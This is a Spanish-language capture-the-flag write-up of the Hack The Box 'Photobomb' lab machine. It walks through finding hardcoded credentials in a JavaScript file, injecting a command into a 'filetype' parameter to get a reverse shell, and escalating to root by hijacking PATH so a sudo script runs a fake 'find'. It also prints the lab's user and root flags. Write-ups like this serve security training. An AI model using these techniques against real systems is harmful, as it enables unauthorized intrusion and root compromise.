---
layout: single
title: Photobomb - Hack The Box
excerpt: "Photobomb es una maquina de dificultad facil donde en el propio codigo de la pagina web hay un archivo JS donde obtenemos el nombre de usuario y su contraseña para acceder a una ruta en la cual no teniamos acceso despues abusamos del parametro filetype para obtener una reverse shell y para la escalada de privilegios vamos a usar un path traverse para obtener una shell como root"
date: 2023-02-18
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-photobomb/new.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - FileType
  - Sudoers privilege
---

<p align="center">
<img src="/assets/images/htb-writeup-photobomb/iconphoto.png">
</p>

## PortScan

```bash
❯ nmap -sCV -p22,80 10.10.11.182 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-18 18:08 CST
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Photobomb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.88 seconds
```

Vemos que hay un subdominio hay que agregarlo al `/etc/hosts`

```bash
❯ whatweb http://10.10.11.182
http://10.10.11.182 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], RedirectLocation[http://photobomb.htb/], Title[302 Found], nginx[1.18.0]
http://photobomb.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], Script, Title[Photobomb], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

```bash
❯ cat /etc/hosts | grep photobomb
10.10.11.182 photobomb.htb
```

Funciona

```
❯ ping -c 1 photobomb.htb
PING photobomb.htb (10.10.11.182) 56(84) bytes of data.
64 bytes from photobomb.htb (10.10.11.182): icmp_seq=1 ttl=63 time=1261 ms

--- photobomb.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1260.996/1260.996/1260.996/0.000 ms
```

Vamos a inspeccionar la pagina web que corre en el puerto 80

![](/assets/images/htb-writeup-photobomb/Web1.png)

Vemos que si damos click en `click here` nos muestra este panel de autenticacion

![](/assets/images/htb-writeup-photobomb/Web2.png)

No tenemos credenciales por el momento asi que podemos ver el codigo fuente

![](/assets/images/htb-writeup-photobomb/Web3.png)

Vemos que hay un archivo `.js` vamos a ver que es lo que tiene

```bash
❯ curl http://photobomb.htb/photobomb.js
```
```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

Nos esta dando un enlace si lo copiamos y pegamos vemos que nos autentica automaticamente y nos muestra esta web

![](/assets/images/htb-writeup-photobomb/Web4.png)

En la parte de del boton rojo vemos que podemos descargar una foto vamos a interceptar con `burpsuite` la peticion

Al interceptar nos muestra esto

![](/assets/images/htb-writeup-photobomb/inter.png)

En la parte de `filetype` vemos que hay es donde esta definiendo la extencion del archivo que queremos asi que podemos tratar de concatenar un comando y directamente vamos a enviarnos una reverse shell 

![](/assets/images/htb-writeup-photobomb/code.png)

<https://www.revshells.com/>

Una vez puesto hay vamos a ponernos en escucha en el puerto `443` para recibir la `shell`

![](/assets/images/htb-writeup-photobomb/listo.png)

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Ahora damos a `forward` para recibir la shell

![](/assets/images/htb-writeup-photobomb/forward.png)

Funciona

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.113] from (UNKNOWN) [10.10.11.182] 45146
bash: cannot set terminal process group (715): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$ 
```

Para poder hacer `ctrl+c` podemos hacer

```bash
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
reset xterm
ENTER
```

Podemos ver la primer flag

```bash
wizard@photobomb:~$ cat user.txt 
857825188e86ff89aee311f10870e0ec
wizard@photobomb:~$ 
```

Nada interesante

```bash
wizard@photobomb:/$ find / -perm -4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/umount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
wizard@photobomb:/$ 
```

## Escalada de Privilegios

Si hacemos un `sudo -l` podemos ejecutar este `script` y setear variables de enterno

```bash
wizard@photobomb:/$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:/$ 
```

Vamos a ver el script y esta usuando el comando `find` que encontramos en la ultima linea lo que esta haciendo es que

```
Esta buscando todos los archivos con extensión ".jpg" en el directorio "source_images" y sus subdirectorios, y cambia el propietario y grupo de cada archivo encontrado a "root:root".
```

```bash
wizard@photobomb:/$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
wizard@photobomb:/$ 
```

`Tenemos la capacidad de modificar variables como el 'path' para utilizar un comando 'find' personalizado. Además, si ejecutamos el comando 'find' con privilegios de administrador, el 'find' se ejecutará con permisos de root.`


```bash
wizard@photobomb:~$ echo bash > find
wizard@photobomb:~$ chmod +x find
```

Ahora somos root

```
wizard@photobomb:~$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# whoami
root
root@photobomb:/home/wizard/photobomb# cd /root
root@photobomb:~# cat root.txt 
bc2ba4ec7d130530e08a60ce6b034fde
root@photobomb:~# 
```
